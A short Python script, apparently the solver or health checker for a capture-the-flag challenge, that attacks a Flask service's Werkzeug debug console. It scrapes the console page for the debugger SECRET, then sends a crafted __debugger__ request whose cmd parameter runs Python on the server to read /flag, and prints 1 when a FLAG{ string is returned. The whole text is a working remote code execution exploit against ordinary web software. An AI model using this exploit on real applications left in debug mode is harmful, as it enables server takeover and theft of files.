import subprocess
f = open("/flag", "r")
print(f.read(), end="")
p = subprocess.Popen(["curl", "flask:5000/console"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, err = p.communicate()
s = out.decode()
index = s.find("SECRET =")
secret = out[index + 10:index + 30]
p2 = subprocess.Popen(["curl", "flask:5000/console?&__debugger__=yes&cmd=with%20open(%22%2Fflag%22,%22r%22)%20as%20f%3A%20print(f.read()%20)&frm=0&s=" + secret.decode()], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out2, err2 = p2.communicate()
print(out2.decode(), end="")
if "FLAG{" in out2.decode():
    print(1)